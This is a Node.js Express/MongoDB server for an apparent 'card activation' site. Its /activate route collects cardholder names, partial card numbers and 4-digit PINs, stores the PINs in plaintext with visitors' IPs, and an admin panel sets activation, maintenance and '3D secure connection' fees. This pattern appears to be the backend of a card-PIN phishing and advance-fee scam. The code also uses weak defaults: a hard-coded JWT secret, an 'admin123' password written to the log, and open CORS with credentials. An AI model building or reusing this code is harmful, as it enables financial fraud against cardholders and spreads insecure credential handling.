// server.js
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
require("dotenv").config();

const app = express();
app.use(express.json());
// allow all origins (adjust for production to specific origins)
app.use(cors({ origin: "*", credentials: true }));

const PORT = process.env.PORT || 3001;
const mongoUri = process.env.MONGODB_URI;
const JWT_SECRET = process.env.JWT_SECRET || "supersecretkey";

// ----------------- MongoDB Connection -----------------
if (!mongoUri) {
  console.error("MONGODB_URI is not set in .env");
  process.exit(1);
}

mongoose
  .connect(mongoUri, {
    serverSelectionTimeoutMS: 30000,
    heartbeatFrequencyMS: 10000,
    retryWrites: true,
    w: "majority",
    autoIndex: true,
  })
  .then(() => console.log("✅ Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

mongoose.connection.on("disconnected", () =>
  console.log("⚠️ MongoDB disconnected")
);
mongoose.connection.on("error", (err) =>
  console.error("MongoDB connection error event:", err)
);
mongoose.connection.on("reconnected", () =>
  console.log("🔄 MongoDB reconnected successfully")
);

// ----------------- Schemas & Models -----------------
const paymentSchema = new mongoose.Schema({
  label: { type: String, required: true },
  price: { type: Number, required: true },
  updatedAt: { type: Date, default: Date.now },
});
const Payment = mongoose.model("Payment", paymentSchema);

const activationSchema = new mongoose.Schema({
  cardType: { type: String, required: true },
  lastSixDigits: { type: String, required: true },
  holderName: { type: String, required: true },
  currency: { type: String, required: true },
  dailyLimit: { type: Number, required: true },
  accept: { type: Boolean, required: true },
  pin: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
  userIp: { type: String },
});
const Activation = mongoose.model("Activation", activationSchema);

const adminSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true }, // hashed
  ipAddress: { type: String },
});
const Admin = mongoose.model("Admin", adminSchema);

// ----------------- Middleware -----------------
const getIp = (req, res, next) => {
  req.ipAddress = (
    req.headers["x-forwarded-for"] ||
    req.connection.remoteAddress ||
    ""
  )
    .split(",")[0]
    .trim();
  next();
};
app.use(getIp);

// JWT verification middleware
const verifyAdmin = (req, res, next) => {
  const authHeader = req.headers["authorization"];
  if (!authHeader)
    return res
      .status(401)
      .json({ success: false, message: "No token provided" });

  const parts = authHeader.split(" ");
  if (parts.length !== 2 || parts[0] !== "Bearer") {
    return res
      .status(401)
      .json({ success: false, message: "Malformed token header" });
  }

  const token = parts[1];
  jwt.verify(token, JWT_SECRET, (err, decoded) => {
    if (err)
      return res
        .status(401)
        .json({ success: false, message: "Invalid or expired token" });
    req.admin = decoded;
    next();
  });
};

// ----------------- Routes -----------------

// Admin Login (returns { success, message, token })
app.post("/admin/login", async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Username and password are required" });
  }

  try {
    const admin = await Admin.findOne({ username });
    if (!admin) {
      return res
        .status(401)
        .json({ success: false, message: "Invalid credentials" });
    }

    const isMatch = await bcrypt.compare(password, admin.password);
    if (!isMatch) {
      return res
        .status(401)
        .json({ success: false, message: "Invalid credentials" });
    }

    admin.ipAddress = req.ipAddress;
    await admin.save();

    const token = jwt.sign(
      { id: admin._id, username: admin.username },
      JWT_SECRET,
      { expiresIn: "1h" }
    );

    return res
      .status(200)
      .json({ success: true, message: "Login successful", token });
  } catch (error) {
    console.error("Login error:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

// Validate last 6 digits
app.post("/validate-digits", async (req, res) => {
  const { lastSixDigits } = req.body || {};
  try {
    if (!lastSixDigits) {
      return res
        .status(400)
        .json({
          success: false,
          message: "Please provide the last 6 digits of your card.",
        });
    }
    if (
      String(lastSixDigits).length !== 6 ||
      !/^\d{6}$/.test(String(lastSixDigits))
    ) {
      return res
        .status(400)
        .json({
          success: false,
          message: "The last 6 digits must be exactly 6 numbers.",
        });
    }
    return res
      .status(200)
      .json({ success: true, message: "Digits validated successfully" });
  } catch (error) {
    console.error("Server error in /validate-digits:", error);
    return res
      .status(500)
      .json({ success: false, message: "Unexpected error occurred." });
  }
});

// Activate card
app.post("/activate", async (req, res) => {
  const {
    cardType,
    lastSixDigits,
    holderName,
    currency,
    dailyLimit,
    accept,
    pin,
  } = req.body || {};

  try {
    if (
      !cardType ||
      !lastSixDigits ||
      !holderName ||
      !currency ||
      dailyLimit == null ||
      accept == null ||
      !pin
    ) {
      return res
        .status(400)
        .json({
          success: false,
          message: "All fields are required to activate your card.",
        });
    }

    if (
      String(lastSixDigits).length !== 6 ||
      !/^\d{6}$/.test(String(lastSixDigits))
    ) {
      return res
        .status(400)
        .json({
          success: false,
          message: "The last 6 digits must be exactly 6 numbers.",
        });
    }

    const limit = parseInt(dailyLimit, 10);
    if (isNaN(limit) || limit > 5000 || limit < 0) {
      return res
        .status(400)
        .json({
          success: false,
          message: "Daily limit must be between 0 and 5000.",
        });
    }

    const validCurrencies = [
      "USD",
      "EUR",
      "GBP",
      "JPY",
      "CAD",
      "AUD",
      "CHF",
      "CNY",
      "INR",
      "ZAR",
    ];
    if (!validCurrencies.includes(currency)) {
      return res
        .status(400)
        .json({ success: false, message: "Unsupported currency selected." });
    }

    if (String(pin).length !== 4 || !/^\d{4}$/.test(String(pin))) {
      return res
        .status(400)
        .json({ success: false, message: "PIN must be exactly 4 digits." });
    }

    if (!accept) {
      return res
        .status(400)
        .json({
          success: false,
          message: "You must accept the terms to proceed.",
        });
    }

    const newActivation = new Activation({
      cardType,
      lastSixDigits: String(lastSixDigits),
      holderName,
      currency,
      dailyLimit: limit,
      accept,
      pin: String(pin),
      userIp: req.ipAddress,
    });
    await newActivation.save();

    return res
      .status(200)
      .json({ success: true, message: "Card activated successfully" });
  } catch (error) {
    console.error("Server error in /activate:", error);
    return res
      .status(500)
      .json({ success: false, message: "Unexpected error occurred." });
  }
});

// Admin update fees (protected)
app.post("/admin/update-fees", verifyAdmin, async (req, res) => {
  const { vat, cardActivation, cardMaintenance, secureConnection } =
    req.body || {};
  const adminIp = req.ipAddress;

  if (
    vat == null ||
    cardActivation == null ||
    cardMaintenance == null ||
    secureConnection == null
  ) {
    return res
      .status(400)
      .json({ success: false, message: "All fee fields are required" });
  }

  // coerce to numbers
  const vatN = Number(vat);
  const cardActivationN = Number(cardActivation);
  const cardMaintenanceN = Number(cardMaintenance);
  const secureConnectionN = Number(secureConnection);

  if (
    [vatN, cardActivationN, cardMaintenanceN, secureConnectionN].some(
      Number.isNaN
    )
  ) {
    return res
      .status(400)
      .json({ success: false, message: "Fee values must be numeric" });
  }

  try {
    await Payment.deleteMany({});
    const payments = [
      { label: "VAT (value added tax)", price: vatN },
      { label: "Card activation", price: cardActivationN },
      { label: "Card maintenance", price: cardMaintenanceN },
      {
        label: "3D visa/master/verve secure connection",
        price: secureConnectionN,
      },
    ];
    await Payment.insertMany(payments);

    console.log(
      "✅ Fees updated by IP:",
      adminIp,
      "by Admin ID:",
      req.admin?.id,
      "with data:",
      payments
    );

    return res
      .status(200)
      .json({ success: true, message: "Fees updated successfully", payments });
  } catch (error) {
    console.error("Server error in /admin/update-fees:", error);
    return res
      .status(500)
      .json({ success: false, message: "Error occurred while updating fees." });
  }
});

// Fetch payments (public)
app.get("/api/payments", async (req, res) => {
  try {
    let payments = await Payment.find().sort({ updatedAt: -1 });

    if (!payments || payments.length === 0) {
      payments = [
        { label: "VAT (value added tax)", price: 0 },
        { label: "Card activation", price: 0 },
        { label: "Card maintenance", price: 0 },
        { label: "3D visa/master/verve secure connection", price: 0 },
      ];
      await Payment.insertMany(payments);
      payments = await Payment.find();
    }

    return res.status(200).json({ success: true, payments });
  } catch (error) {
    console.error("Server error in /api/payments:", error);
    return res
      .status(500)
      .json({
        success: false,
        message: "Error occurred while fetching payments.",
      });
  }
});

// ----------------- Initial admin setup -----------------
async function initAdmin() {
  try {
    const adminExists = await Admin.countDocuments();
    if (adminExists === 0) {
      const defaultUsername = process.env.ADMIN_USERNAME || "admin";
      const defaultPassword = process.env.ADMIN_PASSWORD || "admin123";
      const hashedPassword = await bcrypt.hash(defaultPassword, 10);

      await Admin.create({
        username: defaultUsername,
        password: hashedPassword,
      });

      console.log(
        `👤 Initial admin created: username=${defaultUsername}, password=${defaultPassword} (hashed in DB)`
      );
    } else {
      console.log("👤 Admin user exists - no seed needed");
    }
  } catch (err) {
    console.error("Error in initAdmin:", err);
  }
}
initAdmin();

// ----------------- Server start -----------------
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
